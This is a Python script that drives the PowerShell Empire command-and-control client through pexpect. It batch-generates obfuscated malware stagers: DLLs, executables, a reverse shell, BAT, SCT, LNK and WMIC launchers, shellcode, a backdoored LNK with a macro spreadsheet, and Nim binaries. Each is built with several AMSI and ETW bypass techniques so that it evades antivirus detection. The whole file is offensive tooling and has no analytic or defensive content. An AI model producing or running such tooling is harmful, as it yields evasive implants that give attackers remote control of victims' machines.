import pexpect
import time

def main():
		#start_time = time.time()
		Empire = pexpect.spawn('./powershell-empire client')
		Empire.sendline('help')

# Stager as Windows_dll
		Empire.sendline('usestager windows/dll')
		Empire.sendline('set Listener http')

		Empire.sendline('set Bypasses mattifestation')
		Empire.sendline('set Obfuscate True')
		Empire.sendline('set OutFile /root/Empire_powershell/Manifest.dll')
		Empire.sendline('execute')
		time.sleep(4)

		Empire.sendline('set Bypasses Liberman')
		Empire.sendline('set Obfuscate True')
		Empire.sendline('set OutFile /root/Empire_powershell/Liberman.dll')
		Empire.sendline('execute')
		time.sleep(4)

		Empire.sendline('set Bypasses etw')
		Empire.sendline('set Obfuscate True')
		Empire.sendline('set OutFile /root/Empire_powershell/etw.dll')
		Empire.sendline('execute')
		time.sleep(4)

		Empire.sendline('set Bypasses RastaMouse')
		Empire.sendline('set Obfuscate True')
		Empire.sendline('set OutFile /root/Empire_powershell/RastaMouse.dll')
		Empire.sendline('execute')
		time.sleep(4)

		Empire.sendline('set Bypasses ironpython_amsi')
		Empire.sendline('set Obfuscate True')
		Empire.sendline('set OutFile /root/Empire_powershell/ironpython_amsi.dll')
		Empire.sendline('execute')
		time.sleep(4)

# Stager as Cmd_Exec
		Empire.sendline('usestager windows/cmd_exec')
		Empire.sendline('set Listener http')

		Empire.sendline('set Bypasses mattifestation')
		Empire.sendline('set Obfuscate True')
		Empire.sendline('set OutFile /root/Empire_powershell/ManifestCmd_exec.exe')
		Empire.sendline('execute')
		time.sleep(4)

		Empire.sendline('set Bypasses Liberman')
		Empire.sendline('set Obfuscate True')
		Empire.sendline('set OutFile /root/Empire_powershell/LibermanCmd_exec.exe')
		Empire.sendline('execute')
		time.sleep(4)

		Empire.sendline('set Bypasses etw')
		Empire.sendline('set Obfuscate True')
		Empire.sendline('set OutFile /root/Empire_powershell/etwCmd_exec.exe')
		Empire.sendline('execute')
		time.sleep(4)

		Empire.sendline('set Bypasses RastaMouse')
		Empire.sendline('set Obfuscate True')
		Empire.sendline('set OutFile /root/Empire_powershell/RastaMouseCmd_exec.exe')
		Empire.sendline('execute')
		time.sleep(4)

		Empire.sendline('set Bypasses ironpython_amsi')
		Empire.sendline('set Obfuscate True')
		Empire.sendline('set OutFile /root/Empire_powershell/ironpython_amsiCmd_exec.exe')
		Empire.sendline('execute')
		time.sleep(4)

# stager as Reversehll

		Empire.sendline('usestager windows/reverseshell')
		Empire.sendline('set Listener http')
		Empire.sendline('set OutFile /root/Empire_powershell/Reverseshell_launcher.exe')
		Empire.sendline('execute')
		time.sleep(4)

# Stager as Launcher_SCT

		Empire.sendline('usestager windows/launcher_sct')
		Empire.sendline('set Listener http')
		Empire.sendline('set Obfuscate True')
		Empire.sendline('execute')
		time.sleep(4)

# Stager as Launcher_LNK

		Empire.sendline('usestager windows/launcher_lnk')
		Empire.sendline('set Listener http')
		Empire.sendline('execute')
		time.sleep(4)

# Launcher as Wmic

		Empire.sendline('usestager windows/wmic')
		Empire.sendline('set Listener http')
		Empire.sendline('set Obfuscate True')
		Empire.sendline('execute')
		time.sleep(4)

# Stager as Launcher_bat
		Empire.sendline('usestager windows/launcher_bat')
		Empire.sendline('set Listener http')

		Empire.sendline('set Bypasses mattifestation')
		Empire.sendline('set Obfuscate True')
		Empire.sendline('set OutFile /root/Empire_powershell/ManifestLaun.bat')
		Empire.sendline('execute')
		time.sleep(4)

		Empire.sendline('set Bypasses Liberman')
		Empire.sendline('set Obfuscate True')
		Empire.sendline('set OutFile /root/Empire_powershell/LibermanLaun.bat')
		Empire.sendline('execute')
		time.sleep(4)

		Empire.sendline('set Bypasses etw')
		Empire.sendline('set Obfuscate True')
		Empire.sendline('set OutFile /root/Empire_powershell/etwLaun.bat')
		Empire.sendline('execute')
		time.sleep(4)

		Empire.sendline('set Bypasses RastaMouse')
		Empire.sendline('set Obfuscate True')
		Empire.sendline('set OutFile /root/Empire_powershell/RastaMouseLaun.bat')
		Empire.sendline('execute')
		time.sleep(4)

		Empire.sendline('set Bypasses ironpython_amsi')
		Empire.sendline('set Obfuscate True')
		Empire.sendline('set OutFile /root/Empire_powershell/ironpython_amsiLaun.bat')
		Empire.sendline('execute')
		time.sleep(4)

# Stager as Shellcode
		Empire.sendline('usestager windows/shellcode')
		Empire.sendline('set Listener http')

		Empire.sendline('set Bypasses mattifestation')
		Empire.sendline('set Obfuscate True')
		Empire.sendline('set OutFile /root/Empire_powershell/ManifestLaun.bin')
		Empire.sendline('execute')
		time.sleep(4)

		Empire.sendline('set Bypasses Liberman')
		Empire.sendline('set Obfuscate True')
		Empire.sendline('set OutFile /root/Empire_powershell/LibermanLaun.bin')
		Empire.sendline('execute')
		time.sleep(4)

		Empire.sendline('set Bypasses etw')
		Empire.sendline('set Obfuscate True')
		Empire.sendline('set OutFile /root/Empire_powershell/etwLaun.bin')
		Empire.sendline('execute')
		time.sleep(4)

		Empire.sendline('set Bypasses RastaMouse')
		Empire.sendline('set Obfuscate True')
		Empire.sendline('set OutFile /root/Empire_powershell/RastaMouseLaun.bin')
		Empire.sendline('execute')
		time.sleep(4)

		Empire.sendline('set Bypasses ironpython_amsi')
		Empire.sendline('set Obfuscate True')
		Empire.sendline('set OutFile /root/Empire_powershell/ironpython_amsiLaun.bin')
		Empire.sendline('execute')
		time.sleep(4)

# Stager as BackDoorLnkMacro
		Empire.sendline('usestager windows/backdoorLnkMacro')
		Empire.sendline('set Listener http')

		Empire.sendline('set Bypasses mattifestation')
		Empire.sendline('set Obfuscate True')
		Empire.sendline('set XlsOutFile /var/lib/powershell-empire/empire/client/generated-stagers/Manifest.xls')
		Empire.sendline('set OutFile ManifestlnkMac')
		Empire.sendline('execute')
		time.sleep(4)

		Empire.sendline('set Bypasses Liberman')
		Empire.sendline('set Obfuscate True')
		Empire.sendline('set XlsOutFile /var/lib/powershell-empire/empire/client/generated-stagers/Liberman.xls')
		Empire.sendline('set OutFile /root/Empire_powershell/LibermanlnkMac')
		Empire.sendline('execute')
		time.sleep(4)

		Empire.sendline('set Bypasses etw')
		Empire.sendline('set Obfuscate True')
		Empire.sendline('set XlsOutFile /var/lib/powershell-empire/empire/client/generated-stagers/etw.xls')
		Empire.sendline('set OutFile /root/Empire_powershell/etwlnkMac')
		Empire.sendline('execute')
		time.sleep(4)

		Empire.sendline('set Bypasses RastaMouse')
		Empire.sendline('set Obfuscate True')
		Empire.sendline('set XlsOutFile /var/lib/powershell-empire/empire/client/generated-stagers/Rasta.xls')
		Empire.sendline('set OutFile /root/Empire_powershell/RastaMouselnkMac')
		Empire.sendline('execute')
		time.sleep(4)

		Empire.sendline('set Bypasses ironpython_amsi')
		Empire.sendline('set Obfuscate True')
		Empire.sendline('set XlsOutFile /var/lib/powershell-empire/empire/client/generated-stagers/Amsi.xls')
		Empire.sendline('set OutFile /root/Empire_powershell/ironpython_amsilnkMac')
		Empire.sendline('execute')
		time.sleep(4)
		

# Stager as Windows_nim
		Empire.sendline('usestager windows/nim')
		Empire.sendline('set Listener http')

		Empire.sendline('set Bypasses mattifestation')
		Empire.sendline('set Obfuscate True')
		Empire.sendline('set OutFile /var/lib/powershell-empire/empire/client/generated-stagers/Manifest_nim.exe')
		Empire.sendline('execute')
		time.sleep(4)

		Empire.sendline('set Bypasses Liberman')
		Empire.sendline('set Obfuscate True')
		Empire.sendline('set OutFile /var/lib/powershell-empire/empire/client/generated-stagers/Liberman_nim.exe')
		Empire.sendline('execute')
		time.sleep(4)

		Empire.sendline('set Bypasses etw')
		Empire.sendline('set Obfuscate True')
		Empire.sendline('set OutFile /var/lib/powershell-empire/empire/client/generated-stagers/etw_nim.exe')
		Empire.sendline('execute')
		time.sleep(4)

		Empire.sendline('set Bypasses RastaMouse')
		Empire.sendline('set Obfuscate True')
		Empire.sendline('set OutFile /var/lib/powershell-empire/empire/client/generated-stagers/Rasta_nim.exe')
		Empire.sendline('execute')
		time.sleep(4)

		Empire.sendline('set Bypasses ironpython_amsi')
		Empire.sendline('set Obfuscate True')
		Empire.sendline('set OutFile /var/lib/powershell-empire/empire/client/generated-stagers/Amsi_nim.exe')
		Empire.sendline('execute')
		time.sleep(4)
		
#END

		Empire.interact()
		Empire.sendcontrol('C')
		Empire.sendline('exit')
		#print("--- %s seconds ---" % (time.time() - start_time))

		
if __name__ == '__main__':
	main()

